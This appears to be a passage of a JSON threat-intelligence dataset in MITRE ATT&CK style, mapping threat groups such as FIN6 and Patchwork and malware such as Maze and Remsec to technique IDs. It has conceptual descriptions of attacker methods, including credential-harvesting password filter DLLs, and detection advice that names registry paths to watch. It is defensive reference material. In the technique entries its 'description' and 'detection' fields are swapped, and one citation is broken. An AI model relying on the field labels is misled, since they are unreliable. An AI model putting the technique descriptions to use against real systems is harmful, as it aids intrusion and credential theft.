                ],
                "description": "PipeMon is a multi-stage modular backdoor used by Winnti Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.012": "Print Processors",
                    "T1573.001": "Symmetric Cryptography",
                    "T1518.001": "Security Software Discovery",
                    "T1134.004": "Parent PID Spoofing",
                    "T1134.002": "Create Process with Token",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1548.002": "Bypass User Account Control",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 22
        },
        {
            "id": "S0141",
            "type": "tool",
            "attributes": {
                "name": "Winnti for Windows",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Winnti for Windows is a Trojan that has been used by multiple groups to carry out intrusions in varied regions from at least 2010 to 2016. One of the groups using this malware is referred to by the same name, Winnti Group; however, reporting indicates a second distinct group, Axiom, also uses the malware.    The Linux variant is tracked separately under Winnti for Linux.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service"
                }
            },
            "val": 3
        },
        {
            "id": "G0043",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Group5",
                "aliases": [],
                "description": "Group5 is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. Group5 has used two commonly available remote access tools (RATs), njRAT and NanoCore, as well as an Android RAT, DroidJack.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0385": "njRAT",
                    "S0336": "NanoCore"
                },
                "techniques": {
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1065": "Uncommonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0041",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Strider",
                "aliases": [
                    "ProjectSauron"
                ],
                "description": "Strider is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0125": "Remsec"
                },
                "techniques": {
                    "T1564.005": "Hidden File System",
                    "T1090.001": "Internal Proxy",
                    "T1556.002": "Password Filter DLL"
                }
            }
        },
        {
            "id": "T1556.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Filter DLL",
                "chain_phase": "credential-access",
                "description": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)",
                "detection": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1053",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Scheduled Task/Job",
                "chain_phase": "execution",
                "description": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1032",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Cryptographic Protocol",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "S0125",
            "type": "tool",
            "attributes": {
                "name": "Remsec",
                "aliases": [
                    "Backdoor.Remsec",
                    "ProjectSauron"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Remsec is a modular backdoor that has been used by Strider and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1052.001": "Exfiltration over USB",
                    "T1518.001": "Security Software Discovery",
                    "T1087.001": "Local Account",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1556.002": "Password Filter DLL",
                    "T1056.001": "Keylogging",
                    "T1003.002": "Security Account Manager",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1053": "Scheduled Task/Job",
                    "T1049": "System Network Connections Discovery",
                    "T1046": "Network Service Scanning",
                    "T1033": "System Owner/User Discovery",
                    "T1032": "Standard Cryptographic Protocol",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 31
        },
        {
            "id": "G0040",
            "type": "group",
            "attributes": {
                "val": 8,
                "name": "Patchwork",
                "aliases": [
                    "Hangover Group",
                    "Dropping Elephant",
                    "Chinastrats",
                    "MONSOON",
                    "Operation Hangover"
                ],
                "description": "Patchwork is a cyberespionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. Patchwork has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. Patchwork was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0475": "BackConfig",
                    "S0272": "NDiskMonitor",
                    "S0262": "QuasarRAT",
                    "S0194": "PowerSploit",
                    "S0131": "TINYTYPHON",
                    "S0130": "Unknown Logger",
                    "S0129": "AutoIt backdoor",
                    "S0128": "BADNEWS"
                },
                "techniques": {
                    "T1587.002": "Code Signing Certificates",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1132.001": "Standard Encoding",
                    "T1102.001": "Dead Drop Resolver",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1027.001": "Binary Padding",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.012": "Process Hollowing",
                    "T1053.005": "Scheduled Task",
                    "T1189": "Drive-by Compromise",
                    "T1197": "BITS Jobs",
                    "T1203": "Exploitation for Client Execution",
                    "T1119": "Automated Collection",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0475",
            "type": "tool",
            "attributes": {
                "name": "BackConfig",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BackConfig is a custom Trojan with a flexible plugin architecture that has been used by Patchwork.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1564.001": "Hidden Files and Directories",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1137.001": "Office Template Macros",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 16
        },
        {
            "id": "S0272",
            "type": "tool",
            "attributes": {
                "name": "NDiskMonitor",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NDiskMonitor is a custom backdoor written in .NET that appears to be unique to Patchwork.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 5
        },
        {
            "id": "S0131",
            "type": "tool",
            "attributes": {
                "name": "TINYTYPHON",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TINYTYPHON is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1083": "File and Directory Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration"
                }
            },
            "val": 4
        },
        {
            "id": "S0130",
            "type": "tool",
            "attributes": {
                "name": "Unknown Logger",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Unknown Logger is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1562.001": "Disable or Modify Tools",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1105": "Ingress Tool Transfer",
                    "T1091": "Replication Through Removable Media",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "T1039",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Network Shared Drive",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0128",
            "type": "tool",
            "attributes": {
                "name": "BADNEWS",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BADNEWS is malware that has been used by the actors responsible for the Patchwork campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1102.002": "Bidirectional Communication",
                    "T1102.001": "Dead Drop Resolver",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.001": "Invalid Code Signature",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.012": "Process Hollowing",
                    "T1053.005": "Scheduled Task",
                    "T1132": "Data Encoding",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1039": "Data from Network Shared Drive",
                    "T1025": "Data from Removable Media",
                    "T1005": "Data from Local System"
                }
            },
            "val": 24
        },
        {
            "id": "G0039",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Suckfly",
                "aliases": [],
                "description": "Suckfly is a China-based threat group that has been active since at least 2014.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0118": "Nidiran"
                },
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1553.002": "Code Signing",
                    "T1078": "Valid Accounts",
                    "T1046": "Network Service Scanning",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "S0118",
            "type": "tool",
            "attributes": {
                "name": "Nidiran",
                "aliases": [
                    "Backdoor.Nidiran"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Nidiran is a custom backdoor developed and used by Suckfly. It has been delivered via strategic web compromise.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1036.004": "Masquerade Task or Service",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1043": "Commonly Used Port",
                    "T1032": "Standard Cryptographic Protocol"
                }
            },
            "val": 5
        },
        {
            "id": "G0038",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Stealth Falcon",
                "aliases": [],
                "description": "Stealth Falcon is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.001": "PowerShell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1053.005": "Scheduled Task",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "G0037",
            "type": "group",
            "attributes": {
                "val": 11,
                "name": "FIN6",
                "aliases": [
                    "Magecart Group 6",
                    "SKELETON SPIDER",
                    "ITG08"
                ],
                "description": "FIN6 is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0552": "AdFind",
                    "S0503": "FrameworkPOS",
                    "S0449": "Maze",
                    "S0446": "Ryuk",
                    "S0381": "FlawedAmmyy",
                    "S0372": "LockerGoga",
                    "S0284": "More_eggs",
                    "S0154": "Cobalt Strike",
                    "S0029": "PsExec",
                    "S0005": "Windows Credential Editor",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1572": "Protocol Tunneling",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1074.002": "Remote Data Staging",
                    "T1204.002": "Malicious File",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.002": "Domain Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.003": "Archive via Custom Method",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1003.003": "NTDS",
                    "T1003.001": "LSASS Memory",
                    "T1110.002": "Password Cracking",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1213": "Data from Information Repositories",
                    "T1134": "Access Token Manipulation",
                    "T1119": "Automated Collection",
                    "T1102": "Web Service",
                    "T1095": "Non-Application Layer Protocol",
                    "T1078": "Valid Accounts",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1059": "Command and Scripting Interpreter",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0503",
            "type": "tool",
            "attributes": {
                "name": "FrameworkPOS",
                "aliases": [
                    "Trinity"
                ],
                "labels": [
                    "malware"
                ],
                "description": "FrameworkPOS is a point of sale (POS) malware used by FIN6 to steal payment card data from sytems that run physical POS devices.",
                "platforms": [],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1560.003": "Archive via Custom Method",
                    "T1057": "Process Discovery",
                    "T1048": "Exfiltration Over Alternative Protocol",
                    "T1005": "Data from Local System"
                }
            },
            "val": 5
        },
        {
            "id": "T1564.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Run Virtual Instance",
                "chain_phase": "defense-evasion",
                "description": "Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a headless (in the background with no UI) virtual instance may be especially suspect. Network adapter information may also be helpful in detecting the use of virtual instances.\n\nIf virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. \n\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.",
                "detection": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1529",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Shutdown/Reboot",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006.",
                "detection": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer. Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0449",
            "type": "tool",
            "attributes": {
                "name": "Maze",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Maze ransomware, previously known as \"ChaCha\", was discovered in May 2019. In addition to encrypting files on victim machines for impact, Maze operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.006": "Run Virtual Instance",
                    "T1071.001": "Web Protocols",
                    "T1568": "Dynamic Resolution",
                    "T1059.003": "Windows Command Shell",
                    "T1562.001": "Disable or Modify Tools",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.001": "Binary Padding",
                    "T1218.007": "Msiexec",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1529": "System Shutdown/Reboot",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1106": "Native API",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 22
        },
        {
            "id": "T1531",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Account Access Removal",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:\n\n* Event ID 4723 - An attempt was made to change an account's password\n* Event ID 4724 - An attempt was made to reset an account's password\n* Event ID 4726 - A user account was deleted\n* Event ID 4740 - A user account was locked out\n\nAlerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
                "detection": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n\nAdversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T0827",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided. The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report. These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0829",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation. By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations. This loss of view can occur without affecting the physical processes themselves.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "S0372",
            "type": "tool",
            "attributes": {
                "name": "LockerGoga",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "LockerGoga is ransomware that has been tied to various attacks on European companies. It was first reported upon in January 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1562.001": "Disable or Modify Tools",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1531": "Account Access Removal",
                    "T1529": "System Shutdown/Reboot",
                    "T1486": "Data Encrypted for Impact",
                    "T0827": "Loss of Control",
                    "T0828": "Loss of Productivity and Revenue",
                    "T0829": "Loss of View"
                }
            },
            "val": 10
        },
        {
            "id": "G0036",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "GCMAN",
                "aliases": [],
                "description": "GCMAN is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1021.005": "VNC",
                    "T1021.004": "SSH"
                }
            }
        },
        {
            "id": "G0035",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Dragonfly",
                "aliases": [
                    "TG-4192",
                    "Crouching Yeti",
                    "IRON LIBERTY",
                    "Energetic Bear"
                ],
                "description": "Dragonfly is a cyber espionage group that has been active since at least 2011. They initially targeted defense and aviation companies but shifted to focus to include the energy sector in early 2013. They have also targeted companies related to industrial control systems. \n\nA similar group emerged in 2015 and was identified by Symantec as Dragonfly 2.0. There is debate over the extent of the overlap between Dragonfly and Dragonfly 2.0, but there is sufficient evidence to lead to these being tracked as two separate groups.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0094": "Trojan.Karagany",
                    "S0093": "Backdoor.Oldrea",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1566": "Phishing",
                    "T1189": "Drive-by Compromise",
                    "T0885": "Commonly Used Port",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment",
                    "T0817": "Drive-by Compromise",
                    "T0852": "Screen Capture"
                }
            }
        },
        {
            "id": "T0888",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Information Discovery",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration. Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors. For example, the system’s operational role and model information can dictate whether it is a relevant target for the adversary’s operational objectives. In addition, the system’s configuration may be used to scope subsequent technique usage. Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation. This information may be used to tailor management actions, such as program download and system or module firmware. An adversary may leverage this same information by issuing calls directly to the system’s API.",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0861",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Point & Tag Identification",
                "chain_phase": "collection-ics",
                "description": [],
                "detection": "Adversaries may collect point and tag values to gain a more comprehensive understanding of the process environment. Points may be values such as inputs, memory locations, outputs or other process specific variables.  Tags are the identifiers given to points for operator convenience. \n\nCollecting such tags provides valuable context to environmental points and enables an adversary to map inputs, outputs, and other values to their control processes. Understanding the points being collected may inform an adversary on which processes and values to keep track of over the course of an operation.",
                "is_subtype": false,
                "platforms": [
                    "Data Historian",
                    "Control Server",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0862",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Supply Chain Compromise",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may perform supply chain compromise to gain control systems environment access by means of infected products, software, and workflows. Supply chain compromise is the manipulation of products, such as devices or software, or their delivery mechanisms before receipt by the end consumer. Adversary compromise of these products and mechanisms is done for the goal of data or system compromise, once infected products are introduced to the target environment. \n\nSupply chain compromise can occur at all stages of the supply chain, from manipulation of development tools and environments to manipulation of developed products and tools distribution mechanisms. This may involve the compromise and replacement of legitimate software and patches, such as on third party or vendor websites. Targeting of supply chain compromise can be done in attempts to infiltrate the environments of a specific audience. In control systems environments with assets in both the IT and OT networks, it is possible a supply chain compromise affecting the IT environment could enable further access to the OT environment. Counterfeit devices may be introduced to the global supply chain posing safety and cyber risks to asset owners and operators. These devices may not meet the safety, engineering and manufacturing requirements of regulatory bodies but may feature tagging indicating conformance with industry standards. Due to the lack of adherence to standards and overall lesser quality, the counterfeit products may pose a serious safety and operational risk. Yokogawa identified instances in which their customers received counterfeit differential pressure transmitters using the Yokogawa logo. The counterfeit transmitters were nearly indistinguishable with a semblance of functionality and interface that mimics the genuine product.\n\nF-Secure Labs analyzed the approach the adversary used to compromise victim systems with Havex.  - 201406) The adversary planted trojanized software installers available on legitimate ICS/SCADA vendor websites. After being 